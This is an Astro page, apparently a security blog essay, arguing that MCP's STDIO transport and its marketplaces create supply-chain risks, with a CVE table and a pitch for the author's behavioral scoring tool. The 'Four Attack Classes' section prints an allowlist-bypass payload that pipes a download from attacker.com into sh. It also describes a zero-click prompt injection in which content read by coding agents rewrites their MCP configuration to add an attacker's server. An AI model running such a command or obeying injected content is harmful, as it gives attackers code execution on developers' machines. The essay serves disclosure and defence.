@@ -1,0 +1,392 @@
+---
+import Layout from '../../layouts/Layout.astro';
+---
+
+<Layout
+  title="MCP's Security Crisis Is Architectural, Not Accidental — Commit"
+  description="OX Security proved STDIO transport is RCE by design. 9 of 11 MCP marketplaces accepted a malicious server. Anthropic called it expected behavior. This is the npm supply chain crisis, replaying at the agent layer."
+  canonical="https://getcommit.dev/blog/mcp-security-crisis/"
+  publishDate="2026-04-20"
+>
+
+  <!-- Nav -->
+  <nav>
+    <div class="container nav-inner">
+      <a href="/" class="nav-brand">Commit</a>
+      <ul class="nav-links">
+        <li><a href="/extension">Extension</a></li>
+        <li><a href="/blog">Writing</a></li>
+        <li><a href="/pricing">Pricing</a></li><li><a href="/docs">Docs</a></li><li><a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="mailto:pico@amdal.dev">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Essay -->
+  <article class="essay">
+    <div class="container">
+      <div class="editorial">
+
+        <!-- Header -->
+        <header class="essay-header">
+          <div class="essay-meta animate-in delay-1">
+            <time datetime="2026-04-20">April 20, 2026</time>
+          </div>
+          <h1 class="essay-title animate-in delay-2">MCP's Security Crisis Is Architectural, Not Accidental</h1>
+          <p class="essay-subtitle animate-in delay-3">
+            OX Security proved STDIO transport is RCE by design. 9 of 11 MCP marketplaces accepted a malicious server without detection. Anthropic called it &ldquo;expected behavior.&rdquo; This is the npm supply chain crisis, replaying at the agent layer &mdash; and marketplace review gates can't stop it.
+          </p>
+          <p class="essay-byline animate-in delay-4">Pico</p>
+        </header>
+
+        <!-- Body -->
+        <div class="essay-body">
+
+          <p>
+            On April 15, 2026, OX Security published research under the title &ldquo;The Mother of All AI Supply Chains.&rdquo; The finding: Anthropic&rsquo;s Model Context Protocol &mdash; the de facto standard for connecting AI agents to external tools &mdash; has a fundamental architectural vulnerability in every official SDK, across all ten supported languages.
+          </p>
+          <p>
+            The vulnerability class is not a bug. It is how MCP was designed to work.
+          </p>
+          <p>
+            MCP&rsquo;s STDIO transport accepts arbitrary command strings and passes them to subprocess execution without validation, sanitization, or sandboxing. The critical detail: <strong>commands execute before MCP handshake validation occurs.</strong> Pass a malicious command to the transport layer, receive an error &mdash; and the command has already run. No sanitization warnings. No red flags in the developer toolchain. Nothing.
+          </p>
+          <p>
+            This affects the Python SDK (73 million downloads, 32,000+ repositories), the TypeScript SDK, and every other official implementation. 150 million cumulative downloads. An estimated 200,000 vulnerable instances. All ten SDKs &mdash; Python, TypeScript, Java, Kotlin, C#, Go, Ruby, Swift, PHP, and Rust.
+          </p>
+          <p>
+            Anthropic&rsquo;s response, in their own words: &ldquo;This is an explicit part of how stdio MCP servers work and we believe that this design does represent a secure default.&rdquo;
+          </p>
+          <p>
+            They declined to modify the protocol.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Four Attack Classes</h2>
+
+          <p>
+            OX Security didn&rsquo;t just find one vulnerability. They mapped four distinct attack vectors, all flowing from the same architectural assumption: that configuration files and transport inputs can be trusted.
+          </p>
+
+          <p>
+            <strong>1. Unauthenticated command injection via STDIO transport.</strong> The root vulnerability. MCP&rsquo;s STDIO transport calls <code>subprocess.Popen()</code> (Python) or <code>child_process.spawn()</code> (Node) with developer-supplied command strings. There is no command allowlist, no manifest, no signing. The researchers demonstrated this against LangFlow (915 publicly accessible instances found on Shodan with unauthenticated session tokens), LiteLLM, IBM LangFlow, Flowise, LettaAI, and LangBot.
+          </p>
+          <p>
+            <strong>2. Hardening bypass via argument injection.</strong> Even developers who implement allowlists are vulnerable. Flowise&rsquo;s input filtering was bypassed in a single step using <code>npx -c "curl attacker.com | sh"</code>. The allowlist permits <code>npx</code>; the <code>-c</code> flag turns it into an arbitrary code execution gateway. This is the pattern that makes developer-side mitigation structurally insufficient &mdash; every allowed command is a potential bypass.
+          </p>
+          <p>
+            <strong>3. Zero-click prompt injection.</strong> Malicious content processed by an AI agent modifies the local MCP configuration file, registering an attacker-controlled server. In Windsurf (<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30615" target="_blank" rel="noopener">CVE-2026-30615</a>, CVSS 8.0), this was a true zero-click &mdash; processing a malicious HTML document triggered unauthorized MCP configuration changes with no user interaction. OX tested the same class across Claude Code, Cursor, Gemini-CLI, and GitHub Copilot. All were affected. Only Windsurf received a CVE.
+          </p>
+          <p>
+            <strong>4. Marketplace poisoning.</strong> OX uploaded a proof-of-concept malicious MCP server to 11 major MCP marketplaces. <strong>9 of 11 accepted it without detection.</strong> No review process flagged it. No automated scanning caught it. The server passed every gate between upload and installation.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>Why This Can&rsquo;t Be Patched</h2>
+
+          <p>
+            OX proposed four fixes to Anthropic. All were declined.
+          </p>
+          <ol>
+            <li>Manifest-only execution replacing arbitrary command strings</li>
+            <li>Command allowlisting blocking high-risk binaries</li>
+            <li>Mandatory dangerous-mode opt-in flag for dynamic arguments</li>
+            <li>Marketplace verification with signed security manifests</li>
+          </ol>
+          <p>
+            These aren&rsquo;t exotic proposals. They&rsquo;re standard supply chain security practices &mdash; the same controls that npm, PyPI, and Docker Hub have adopted (or are adopting) after their own supply chain crises. Anthropic declined all four and updated their SECURITY.md documentation instead.
+          </p>
+          <p>
+            The OX researchers noted: &ldquo;One architectural change at the protocol level would have protected every downstream project, every developer, and every end user who relied on MCP today. That&rsquo;s what it means to own the stack.&rdquo;
+          </p>
+          <p>
+            Instead, each downstream project must independently rediscover the vulnerability and implement its own mitigations. OX issued 30+ responsible disclosures and discovered 10+ high/critical-severity CVEs patching individual projects. The root cause remains unfixed.
+          </p>
+          <p>
+            This architectural choice has consequences. In January through April 2026, the MCP ecosystem accumulated a casualty list that looks less like a young protocol finding its feet and more like a fundamental design failure propagating outward:
+          </p>
+
+          <div style="overflow-x: auto; margin: 2rem 0;">
+            <table style="width: 100%; border-collapse: collapse; font-size: 0.875rem;">
+              <thead>
+                <tr style="border-bottom: 2px solid var(--border-light);">
+                  <th style="text-align: left; padding: 0.75rem 0.5rem 0.75rem 0; font-weight: 600;">CVE</th>
+                  <th style="text-align: left; padding: 0.75rem 0.5rem; font-weight: 600;">Product</th>
+                  <th style="text-align: right; padding: 0.75rem 0.5rem; font-weight: 600;">CVSS</th>
+                  <th style="text-align: left; padding: 0.75rem 0 0.75rem 0.5rem; font-weight: 600;">What Happened</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid var(--border-light); background: rgba(220, 38, 38, 0.04);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-33032</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">nginx-ui</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;"><strong>9.8</strong></td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">MCPwn &mdash; 2 HTTP requests, zero auth, full server takeover. 2,600+ exposed. <strong>Actively exploited.</strong></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light); background: rgba(220, 38, 38, 0.04);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-5058</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">aws-mcp-server</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;"><strong>9.8</strong></td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">Pre-auth RCE via OS command injection in allowed commands list</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light); background: rgba(220, 38, 38, 0.04);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-5059</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">aws-mcp-server</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;"><strong>9.8</strong></td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">Second injection point in same product</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-32211</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">@azure-devops/mcp</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;"><strong>9.1</strong></td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">Zero authentication &mdash; exposes repos, pipelines, API keys to anyone with network access</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-27825/26</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">mcp-atlassian</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">—</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">MCPwnfluence &mdash; SSRF + arbitrary file write &rarr; unauthenticated RCE</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-30615</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">Windsurf</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">8.0</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">True zero-click prompt injection &mdash; no user interaction required</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><code>CVE-2026-26118</code></td>
+                  <td style="padding: 0.75rem 0.5rem;">Azure MCP Server</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">—</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">SSRF for privilege elevation</td>
+                </tr>
+                <tr>
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0;"><em>10+ additional</em></td>
+                  <td style="padding: 0.75rem 0.5rem;">LiteLLM, Flowise, Agent Zero, etc.</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">—</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;">OX Security disclosures from STDIO injection class</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>
+            The MCPwn exploit is particularly instructive. The root cause was a single missing middleware call on the <code>/mcp_message</code> endpoint of nginx-ui. While <code>/mcp</code> required both IP whitelist and authentication, <code>/mcp_message</code> only applied the IP whitelist &mdash; which defaults to &ldquo;allow all&rdquo; when empty. Two HTTP requests. Full server takeover. The fix was 27 characters of code: adding <code>, middleware.AuthRequired()</code> to one route definition.
+          </p>
+          <p>
+            Two thousand six hundred servers were exposed across 50+ countries before that fix shipped. MCPwn was actively exploited in the wild.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The npm Parallel</h2>
+
+          <p>
+            If this pattern feels familiar, it should. We&rsquo;ve seen it before &mdash; at the package registry layer.
+          </p>
+          <p>
+            <strong>2016: left-pad.</strong> An 11-line npm package was unpublished, breaking the build systems of Facebook, Airbnb, and thousands of other projects. The lesson was supposed to be: don&rsquo;t depend on trivially small packages from unknown authors for critical infrastructure.
+          </p>
+          <p>
+            <strong>2018: event-stream.</strong> A popular package&rsquo;s maintainer transferred ownership to a stranger. The new maintainer injected a dependency &mdash; flatmap-stream &mdash; that stole cryptocurrency wallet keys. 8 million weekly downloads. The attack was live for two months before a developer noticed. When we <a href="/blog/event-stream-autopsy">applied behavioral scoring retrospectively</a>, the injected dependency scored 13 out of 100. The structural signals were screaming. Nobody was listening.
+          </p>
+          <p>
+            <strong>2021: ua-parser-js.</strong> A maintainer&rsquo;s npm account was compromised. Cryptominer and credential stealer injected into a package with 7.9 million weekly downloads. The compromise was in the <em>published artifact</em>, not the source repo &mdash; <code>npm audit</code> showed nothing.
+          </p>
+          <p>
+            <strong>2026: axios.</strong> 101 million weekly downloads. <a href="/blog/the-axios-signal">Compromised</a>. npm audit reported zero issues. Behavioral scoring had flagged it CRITICAL weeks earlier &mdash; not because the code was malicious, but because the structural risk indicators (maintainer concentration, dependency tree instability, publishing patterns) crossed every threshold.
+          </p>
+          <p>
+            The pattern is identical every time:
+          </p>
+          <ol>
+            <li>An ecosystem grows faster than its trust infrastructure</li>
+            <li>A registry or marketplace becomes the primary distribution channel</li>
+            <li>Attackers discover that the registry&rsquo;s review gates are insufficient</li>
+            <li>Supply chain attacks scale to the size of the distribution channel</li>
+            <li>The community responds with more review gates, which fail the same way</li>
+          </ol>
+          <p>
+            MCP marketplaces are at step 3. OX Security just proved it with 9 of 11 marketplaces accepting malicious servers. The same trajectory that took npm a decade to partially address is compressing into months &mdash; because the attack surface is larger (arbitrary code execution, not just package code) and the stakes are higher (agent tool access, not just build-time dependency injection).
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>Why Review Gates Always Fail</h2>
+
+          <p>
+            Every response to a supply chain crisis follows the same playbook: add more review. More scanning. More human oversight. More automated checks at the gate.
+          </p>
+          <p>
+            The fundamental problem: <strong>review gates verify state at a point in time.</strong> The attack happens after the gate closes.
+          </p>
+          <p>
+            We wrote about this as <a href="/blog/toctou-of-trust">the TOCTOU of trust</a> &mdash; time-of-check vs. time-of-use. A server passes marketplace review on Monday. The maintainer pushes a malicious update on Tuesday. The next review gate is the next time someone files a report. Between those two moments, every user of that server is exposed.
+          </p>
+          <p>
+            npm tried to solve this with provenance attestations, package signatures, and <code>npm audit</code>. None of them caught the ua-parser-js compromise. None of them would have caught event-stream. The attestations verify that a published package was built from a specific commit in a specific repo &mdash; which is true even when the commit itself is malicious.
+          </p>
+          <p>
+            MCP marketplaces are recreating the same architecture with the same limitations. A marketplace that reviews servers at upload time cannot detect:
+          </p>
+          <ul>
+            <li>A server that behaves differently after installation than during review</li>
+            <li>A server whose maintainer account is compromised post-review</li>
+            <li>A server that passes all static checks but exploits STDIO transport at runtime</li>
+            <li>A server that uses prompt injection to modify other servers&rsquo; configurations</li>
+          </ul>
+          <p>
+            The Azure MCP Server CVE (<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32211" target="_blank" rel="noopener">CVE-2026-32211</a>) adds another dimension: the npm package included a <code>preinstall</code> script that overrode npm registry configuration &mdash; a documented supply chain attack vector. This is a server from a Microsoft-affiliated developer, published on npm, exposing Azure DevOps credentials with zero authentication. The marketplace review model doesn&rsquo;t have a category for &ldquo;the publisher is a trusted entity and the server is still dangerous.&rdquo;
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Missing Signal</h2>
+
+          <p>
+            Here is the structural gap:
+          </p>
+          <p>
+            <strong>Declarations can be faked.</strong> A marketplace listing says &ldquo;verified.&rdquo; A security audit says &ldquo;passed.&rdquo; An npm provenance badge says &ldquo;signed.&rdquo; These are statements about what something <em>was</em> at a point in time. <a href="/blog/declarations-are-gameable">Delve faked SOC2 certificates</a> for 494 companies. 9 of 11 MCP marketplaces accepted a malicious server. The declaration layer is gameable by design &mdash; it&rsquo;s optimized for signaling, not for truth.
+          </p>
+          <p>
+            <strong>Behavior is harder to fake.</strong> A server that makes network requests it shouldn&rsquo;t. A package whose publishing patterns changed. A maintainer who transferred ownership and disappeared. A tool that executes commands outside its stated scope. These are behavioral signals &mdash; patterns in what entities <em>do</em>, not what they <em>say</em>.
+          </p>
+          <p>
+            The npm supply chain taught us this. When we applied <a href="/blog/three-npm-disasters-that-were-predictable">behavioral commitment scoring</a> retrospectively to the three worst npm supply chain attacks, the structural signals were present before every incident. event-stream&rsquo;s injected dependency flatmap-stream scored 13/100. ua-parser-js had single-maintainer concentration risk before its 2021 compromise. colors.js had the same profile before Marak&rsquo;s 2022 sabotage.
+          </p>
+          <p>
+            None of the declaration-based systems &mdash; npm audit, Snyk, Socket (pre-behavioral), marketplace review &mdash; raised an alert.
+          </p>
+          <p>
+            The MCP ecosystem needs the same lesson, applied earlier. The question is not &ldquo;did this server pass review?&rdquo; The question is: <strong>what does this server&rsquo;s behavior, over time, tell us about whether it should be trusted?</strong>
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>Proof-of-Commitment as a Trust Signal</h2>
+
+          <p>
+            This is what <a href="/">Commit</a> was built for.
+          </p>
+          <p>
+            Proof-of-commitment doesn&rsquo;t replace marketplace review. It replaces the <em>trust inference</em> that marketplace review pretends to provide. Instead of a binary gate (listed/not listed, reviewed/not reviewed), it measures a gradient of behavioral commitment:
+          </p>
+          <ul>
+            <li><strong>Maintainer longevity.</strong> How long has the author been actively maintaining this? Transferred ownership to a stranger (event-stream) shows up as a discontinuity.</li>
+            <li><strong>Publishing consistency.</strong> Regular cadence vs. erratic bursts. Account compromise (ua-parser-js) creates anomalous publish events.</li>
+            <li><strong>Dependency stability.</strong> Injecting a new dependency that itself has no history (flatmap-stream) triggers structural risk flags.</li>
+            <li><strong>Community engagement.</strong> Issues responded to, PRs merged, documentation maintained. Abandoned packages with high download counts (the core npm risk pattern) score differently than maintained ones.</li>
+            <li><strong>Financial commitment.</strong> Locked collateral signals skin in the game. Not a gate &mdash; a gradient. More collateral, stronger signal.</li>
+          </ul>
+          <p>
+            These signals are continuous, not point-in-time. They degrade naturally when behavior changes. A server that was trustworthy last month and whose maintainer vanished this month produces a different score &mdash; without anyone filing a report, running a scan, or reviewing a listing.
+          </p>
+          <p>
+            For MCP servers specifically, this means:
+          </p>
+          <ul>
+            <li>Score the source repository, not just the marketplace listing</li>
+            <li>Track behavioral changes between versions, not just code diffs</li>
+            <li>Flag when a server&rsquo;s structural risk profile crosses thresholds, even when no CVE exists</li>
+            <li>Surface the signal before the marketplace review gate &mdash; not after the exploit</li>
+          </ul>
+
+          <hr class="essay-divider" />
+
+          <h2>What To Do Now</h2>
+
+          <p>
+            If you operate MCP infrastructure, or depend on MCP servers in your development environment:
+          </p>
+          <p>
+            <strong>Audit your MCP servers.</strong> Run <code>npx proof-of-commitment mcp-remote &lt;server&gt;</code> against every server in your configuration. Our scanner doesn&rsquo;t catch the STDIO injection class &mdash; <a href="/blog/mcp-security-landscape-2026">we wrote about that limitation</a> &mdash; but it catches structural risk indicators that correlate with compromise.
+          </p>
+
+          <pre><code>npx proof-of-commitment mcp-remote @modelcontextprotocol/server-github
+
+# Scan a specific package
+npx proof-of-commitment npm express
+
+# Or use the web UI
+# https://getcommit.dev/audit</code></pre>
+
+          <p>
+            <strong>Don&rsquo;t trust marketplace badges.</strong> 9 of 11 marketplace review processes failed. If your security posture depends on &ldquo;this server was listed on a reputable marketplace,&rdquo; it depends on nothing.
+          </p>
+          <p>
+            <strong>Monitor behavior, not just code.</strong> Static analysis is necessary but insufficient. The attacks that matter &mdash; MCPwn, MCPwnfluence, the STDIO injection class &mdash; are behavioral, not structural. Watch what your MCP servers actually do at runtime.
+          </p>
+          <p>
+            <strong>Add trust scoring to CI.</strong> We published a <a href="/blog/ci-trust-scoring-tutorial">5-minute CI integration tutorial</a>. Structural risk flags show up in PR comments before compromised dependencies reach production.
+          </p>
+          <p>
+            The MCP ecosystem is moving at infrastructure speed. The security model hasn&rsquo;t kept up. The response cannot be &ldquo;better review gates&rdquo; &mdash; that&rsquo;s the same answer that failed for npm, failed for PyPI, and just failed for 9 of 11 MCP marketplaces. The response has to be continuous behavioral monitoring, applied at the layer where trust decisions are actually made.
+          </p>
+          <p>
+            The data already exists. The signals are already there. The question is whether we read them before the next MCPwn, or after.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <p class="essay-coda">
+            <em>Sources: <a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/" target="_blank" rel="noopener">OX Security</a> (April 15, 2026), <a href="https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/" target="_blank" rel="noopener">The Register</a> (April 16), <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33032" target="_blank" rel="noopener">CVE-2026-33032</a> (MCPwn), <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5058" target="_blank" rel="noopener">CVE-2026-5058</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5059" target="_blank" rel="noopener">CVE-2026-5059</a> (AWS), <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32211" target="_blank" rel="noopener">CVE-2026-32211</a> (Azure), <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30615" target="_blank" rel="noopener">CVE-2026-30615</a> (Windsurf zero-click). CVE table reflects public disclosures as of April 20, 2026.</em>
+          </p>
+          <p class="essay-coda">
+            <em>Audit your MCP dependencies: <a href="/audit">getcommit.dev/audit</a> | <a href="/blog/ci-trust-scoring-tutorial">CI integration</a> | <a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></em>
+          </p>
+
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Newsletter -->
+  <section class="newsletter-section">
+    <div class="container">
+      <div class="editorial reveal">
+        <h2 style="margin-bottom: 0.75rem;">Stay in the loop</h2>
+        <p style="margin-bottom: 2rem; font-size: 1rem;">
+          Early access, research updates, and the occasional strong opinion.
+        </p>
+
+        <form
+          action="https://buttondown.email/api/emails/embed-subscribe/commitgraph"
+          method="post"
+          target="popupwindow"
+          class="newsletter-form"
+        >
+          <input
+            type="email"
+            name="email"
+            placeholder="you@example.com"
+            required
+            class="newsletter-input"
+          />
+          <button type="submit" class="btn-primary" style="white-space: nowrap;">
+            Subscribe
+          </button>
+        </form>
+
+        <p class="newsletter-note">No spam. Unsubscribe anytime.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container footer-inner">
+      <span class="footer-brand">Commit</span>
+      <ul class="footer-links">
+        <li><a href="/">Home</a></li>
+        <li><a href="/extension">Extension</a></li>
+        <li><a href="/blog">Writing</a></li>
+        <li><a href="/pricing">Pricing</a></li><li><a href="/docs">Docs</a></li><li><a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="mailto:pico@amdal.dev">Contact</a></li>
+      </ul>
+      <span class="footer-locale">Stavanger, Norway</span>
+    </div>
+  </footer>
+
+</Layout>
